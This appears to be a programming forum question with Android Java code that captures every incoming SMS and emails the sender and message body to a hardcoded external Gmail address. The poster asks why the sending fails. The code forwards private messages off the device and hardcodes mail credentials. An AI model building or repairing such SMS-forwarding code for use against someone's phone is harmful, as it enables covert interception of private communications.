<p>I'm trying to read incoming SMS and then send it as email to an E-Mail address. Reading of SMS is done but program is not sending the message to E-Mail address. I'm using JavaMail API to send email. Any help would be much appreciated.</p>  <p><div class="snippet" data-lang="js" data-hide="false"> <div class="snippet-code"> <pre class="snippet-code-html lang-html prettyprint-override"><code>public class IncomingSms extends BroadcastReceiver { 	 	private static final String username = "xyz@gmail.com";     private static final String password = "abcd"; 	//Context context; 	     //Context context; 	 	// Get the object of SmsManager 	final SmsManager sms = SmsManager.getDefault(); 	 	public void onReceive(Context context, Intent intent) { 	 		// Retrieves a map of extended data from the intent. 		final Bundle bundle = intent.getExtras();  		try { 			 			if (bundle != null) { 				 				final Object[] pdusObj = (Object[]) bundle.get("pdus"); 				 				for (int i = 0; i &lt; pdusObj.length; i++) { 					 					SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]); 					String phoneNumber = currentMessage.getDisplayOriginatingAddress(); 					String senderNum = phoneNumber; 			        String body = currentMessage.getDisplayMessageBody(); 					 					//String x = senderNum + "\n" + body; 					 					String message = senderNum + "\n" + body; 					String email_add = "ohmhome4lov@gmail.com"; 				    String subject = "Kiss You"; 			       					sendMail(email_add, subject, message); 			       // Log.i("SmsReceiver", "senderNum: "+ senderNum + "; message: " + message); 			         			        					Toast.makeText(context, "Number: "+ senderNum + ", Message: " + body, Toast.LENGTH_LONG).show(); 					 					/* Intent view = new Intent(context, BroadcastNewSms.class).putExtra("yourname", x.toString()).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 		             		            context.startActivity(view);  */ 			         					 					 				} // end for loop 				 				               } // bundle is null  		} catch (Exception e) { 			Log.e("SmsReceiver", "Exception smsReceiver" +e); 			 		} 	} // onCreate ends  ///////////////////////////////////////// E-Mail Code starts ///////////////////////////////////////////////////////////////////////////////	      private void sendMail(String email_add, String subject, String messageBody) { Session session = createSessionObject();  try { Message message = createMessage(email_add, subject, messageBody, session); new SendMailTask().execute(message); } catch (AddressException e) { e.printStackTrace(); } catch (MessagingException e) { e.printStackTrace(); } catch (UnsupportedEncodingException e) { e.printStackTrace(); } }  private Message createMessage(String email, String subject, String messageBody, Session session) throws MessagingException, UnsupportedEncodingException { Message message = new MimeMessage(session); message.setFrom(new InternetAddress("somnath@e-online-business.com", "SAM")); //Sender Email and Title message.addRecipient(Message.RecipientType.TO, new InternetAddress(email, email));   message.setSubject(subject); message.setText(messageBody); return message; }  private Session createSessionObject() { Properties properties = new Properties(); properties.put("mail.smtp.auth", "true"); properties.put("mail.smtp.starttls.enable", "true"); properties.put("mail.smtp.host", "smtp.gmail.com"); properties.put("mail.smtp.port", "587");  return Session.getInstance(properties, new javax.mail.Authenticator() { protected PasswordAuthentication getPasswordAuthentication() { return new PasswordAuthentication(username, password); } }); }  private class SendMailTask extends AsyncTask&lt;Message, Void, Void&gt; { //private ProgressDialog progressDialog;  @Override protected void onPreExecute() { super.onPreExecute(); //progressDialog = ProgressDialog.show(Enquiry_Form.this, "Please wait", "Sending request", true, false); }  @Override protected void onPostExecute(Void aVoid) { super.onPostExecute(aVoid); //progressDialog.dismiss(); //Toast.makeText(context, "Submitted Successfully", Toast.LENGTH_LONG).show(); }  @Override protected Void doInBackground(Message... messages) { try { Transport.send(messages[0]); } catch (MessagingException e) { e.printStackTrace(); } return null; } }   ///////////////////////////////////////// E-Mail Code ends ///////////////////////////////////////////////////////////////////////////////// 	 	 } // Activity ends</code></pre> </div> </div> </p>